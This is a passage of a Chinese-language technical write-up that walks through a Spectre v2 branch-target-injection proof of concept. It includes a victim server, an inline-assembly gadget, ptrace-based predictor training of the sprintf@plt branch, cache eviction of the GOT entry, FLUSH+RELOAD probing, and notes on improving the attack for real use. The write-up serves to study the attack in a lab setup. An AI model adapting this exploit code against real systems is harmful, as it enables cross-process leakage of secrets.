@@ -1,0 +1,82 @@
+    *   接收字符串，提取整形变量并格式化为字符串后发送返回
+    */
+    char secret[128]={'x'};
+    ...
+    while(1){
+            long a;
+            client_sockfd = accept(server_sockfd, &client_address, (socklen_t*)&client_len);
+            while(read(client_sockfd, buf, 32)){
+                sscanf(buf, "%ld\n", &a);
+                sprintf(send, "%ld\n", a);
+                write(client_sockfd, send, 16);
+            }
+            close(client_sockfd);
+    }
+## **6.2 找到并建立信息传递的通道**
+5.2节分析了当使用FLUSH +
+RELOAD攻击手段时，两个进程之间需要共享一片内存区域，victim通过预测执行将secret字符映射为共享内存的命中位置，而后attack探测出这个命中位置进而还原出secret。这个区域可以建立在系统的共享库中，这里为了清晰讲解攻击原理，直接在victim的可执行文件的.rodata段插入了一个64Kb的ProbeTable数组（256个ascii字符
+× 步长256）。
+    /*
+    *  victim.c   line 14
+    */
+    __attribute__((section(".rodata.transmit"), aligned(0x10000))) const char ProbeTable[0x10000] = {'x'};       //64Kb
+使用mmap将正在运行的victim的ProbeTable映射到attack进程：
+    /*
+    *   attack.c   line 49
+    */
+    mm = mmap(NULL, 0x10000, PROT_READ, MAP_SHARED, fd, 0x20000);
+## **6.3 找到gadget**
+前面5.2节讲到了gadget的作用，首先要在victim中找到一个可以被attack控制的寄存器，分析victim循环部分的汇编可知在调用sprintf之前attack可以控制rdx寄存器，因此可以通过向victim发送secret地址控制rdx指向secret。
+    400c03: 48 8d 95 78 ff ff ff     lea    -0x88(%rbp),%rdx              ! 变量a的地址   
+      400c0a: 48 89 ce                 mov    %rcx,%rsi                           ! 格式化字符串"%ld\n"的地址
+      400c0d: 48 89 c7                 mov    %rax,%rdi                           ! buf的地址
+      400c10: b8 00 00 00 00           mov    $0x0,%eax
+      400c15: e8 f6 fb ff ff           callq  400810 
+      400c1a: 48 8b 95 78 ff ff ff     mov    -0x88(%rbp),%rdx            ! 攻击者传入的整数被装入rdx，并作为sprintf的第三参数
+      400c21: b9 51 00 41 00           mov    $0x410051,%ecx
+      400c26: 48 8d 45 80            lea    -0x80(%rbp),%rax
+      400c2a: 48 89 ce                 mov    %rcx,%rsi                           ! send的地址
+      400c2d: 48 89 c7                 mov    %rax,%rdi                           ! 格式化字符串"%ld\n"的地址
+      400c30: b8 00 00 00 00           mov    $0x0,%eax
+      400c35: e8 c6 fb ff ff           callq  400800 
+我们可以在动态库中寻找gadget，但这里我直接在victim中编写了gadget，这部分代码在victim中不会得到执行：
+    /*
+    *  victim.c  line 21
+    */
+    __asm__(".text\n.globl gadget\ngadget:\n"       //编到.text段，导出gadget符号
+            "xorl %eax, %eax\n"                                 //清空eax
+            "movb (%rdx), %ah\n"                              //rdx可以被攻击者控制
+            "movl ProbeTable(%eax), %eax\n"          //访存
+            "retq\n");
+## **6.4 在victim中找到间接分支**
+在程序中调用外部函数时用到了延迟绑定（Lazy Binding）技术，sprintf是glibc中的函数，call
+[sprintf@plt](mailto:sprintf@plt)调用0x400800处的代码：  
+在0x400800处又跳转到0x6303e0所指向的地址，而0x6303e0则是sprintf的got表项，里面存放了sprintf的真实地址。这里可以确定需要毒化的就是0x400800处的间接分支。在evictor进程的作用下，0x6303e0处的缓存行被从缓存中刷新，导致在取得sprintf地址的过程中出现时间窗口。在trainer进程的作用下，预测器在0x400800处给出的预测地址为gadget的地址，因此CPU预测执行gadget将secret的字符信息泄漏到ProbeTable中。
+## **6.5 训练间接分支**
+每个CPU核心独占一个分支预测器，由于不知道victim会运行在那个CPU上，所以需要在每个核心上运行一个trainer进程。在trainer进程中使用execv函数加载victim，利用ptrace代码注入的手段在sprintf@got（0x6303e0）的位置处填入gadget的地址，再将gadget的第一条指令的机器码改为ret，最后在进程的断点处注入循环代码：
+    loop:
+           mov  sprintf@plt, rax
+           call rax
+           jmp  loop
+由此每个核心上的trainer在循环调用sprintf函数：  
+由于在编译时加入了-fno-pie选项，每次加载victim时进程的虚拟地址空间都是不变的，因此trainer可以模拟正在运行的victim进程。当victim执行sprintf函数时，入口处的间接跳转指令被毒化，CPU预测执行gadget完成信息泄露。
+## **6.6 驱逐缓存**
+预测执行的一个重要条件就是间接分支的目的地址发生缓存刷新导致访存延迟，这里需要fork出一个evictor进程用于不停地刷新sprintf@got造成0x400800处cache
+miss进而引发预测执行。
+## **6.7 FLUSH + RELOAD过程**
+attack向victim循环发送secret的地址0x630480以触发victim执行gadget，然后对ProbeTable以0x100为步长，逐个探测命中情况。一旦某个位置命中次数超过4次便可解析出字符。多次命中的目的是减少偶然性提高解析精度。
+# **七、结果**
+我分别在英特尔i3 2310m（SandyBridge 2代）、i7 4790（Haswell 4代）、i7 6700HQ（Skylake
+6代）三种平台上测试了代码，最终在i7 4790平台上获得了较好的运行效果。
+# **八、改进点**
+实际的利用至少需要做到以下改进：
+  * ProbeTable选定在共享对象中例如.so文件中
+  * gadget也应该在.so中寻找
+# **九、参考资料**
+[1] Understanding Spectre v2 and How the Vulnerability Impact the Cloud
+Security,Gavin-Guo  
+[2] Spectre Attacks: Exploiting Speculative Execution  
+[3] Exploiting Branch Target Injection Jann Horn, Google Project Zero  
+[4] Project Zero Reading privileged memory with a side-channel  
+[5] FLUSH +RELOAD a High Resolution, Low Noise,L3 Cache Side-Channel Attack  
+[6] Last-Level Cache Side-Channel Attacks are Practical
